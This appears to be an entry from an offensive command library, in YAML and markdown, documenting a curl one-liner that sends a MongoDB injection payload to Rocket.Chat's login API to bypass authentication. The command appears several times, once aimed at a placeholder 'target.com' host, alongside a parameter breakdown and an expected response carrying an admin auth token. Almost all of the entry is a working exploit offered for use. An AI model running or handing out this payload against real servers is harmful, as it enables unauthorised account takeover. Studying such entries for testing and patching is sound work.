---
data: >-
  curl -s 'http://127.0.0.1:3000/api/v1/login' -H "Content-Type:
  application/json" -d '{"loginToken": { "$exists": false }}' | head
tags:
  - mongodb-injection
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:30.841Z'
id: c00c8f21-fe89-47d7-aa51-bace70323aea
verified: false
validated: true
submitted: true
---
# curl-mongodb-injection-login-bypass

## Command

```bash
curl -s 'http://127.0.0.1:3000/api/v1/login' -H "Content-Type: application/json" -d '{"loginToken": { "$exists": false }}' | head
```

## Description

This command sends a POST request to the Rocket.Chat login endpoint with a MongoDB injection payload in the loginToken parameter, exploiting lack of sanitization to bypass authentication and retrieve admin tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| `'http://127.0.0.1:3000/api/v1/login'` | Target login endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets JSON request header | Yes |
| `-d '{"loginToken": { "$exists": false }}'` | Payload using $exists to match first user | Yes |
| `| head` | Limits output to first few lines for review | No |

## Examples

### Basic Usage

```bash
curl -s 'http://127.0.0.1:3000/api/v1/login' -H "Content-Type: application/json" -d '{"loginToken": { "$exists": false }}' | head
```

### Advanced Usage

```bash
curl -s -X POST 'https://target.com/api/v1/login' -H "Content-Type: application/json" -d '{"loginToken": { "$exists": false }}' -o response.json
```

## Expected Output

JSON response indicating success: {"status":"success","data":{"userId":"rocket.cat","authToken":"MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB"}} with user details.

## Related

- [[commands/curl-verify-auth-bypass-with-me-endpoint]]
- [[procedures/Exploit-MongoDB-Injection-for-Auth-Bypass]]
